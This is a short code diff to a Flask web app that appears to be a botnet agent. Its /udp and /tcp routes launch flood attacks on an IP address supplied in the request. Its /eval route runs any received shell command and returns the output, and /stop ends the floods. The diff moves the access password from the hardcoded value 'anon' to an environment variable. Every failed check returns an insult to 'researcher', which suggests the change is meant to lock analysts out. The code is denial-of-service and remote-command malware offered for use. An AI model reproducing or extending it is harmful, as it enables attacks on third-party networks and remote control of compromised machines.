@@ -40,7 +40,7 @@ def attack():
 @app.route('/udp')
 def udp():
 	info = json.loads(request.get_data())
-	if info["pass"] != "anon":
+	if info["pass"] != os.getenv("password"):
 		return "fuck off researcher!!"
 	udpflood.flag = True
 	udpflood.ip = info["target"]
@@ -54,7 +54,7 @@ def udp():
 @app.route('/tcp',methods=["POST"])
 def tcp():
 	info = json.loads(request.get_data())
-	if info["pass"] != "anon":
+	if info["pass"] != os.getenv("password"):
 		return "fuck off researcher!!"
 	udpflood.flag = True
 	udpflood.ip = info["target"]
@@ -67,7 +67,7 @@ def tcp():
 @app.route('/eval')
 def eval():
 	info = json.loads(request.get_data())
-	if info["pass"] != "anon":
+	if info["pass"] != os.getenv("password"):
 		return "fuck off researcher!!"
 	proc = subprocess.run(info["command"],shell=True,stdout = subprocess.PIPE, stderr = subprocess.PIPE)
 	return proc.stdout
@@ -75,7 +75,7 @@ def eval():
 @app.route('/stop',methods=["POST"])
 def stop():
 	info = json.loads(request.get_data())
-	if info["pass"] != "anon":
+	if info["pass"] != os.getenv("password"):
 		return "fuck off researcher!!"
 	hammer.flag = False
 	udpflood.flag = False
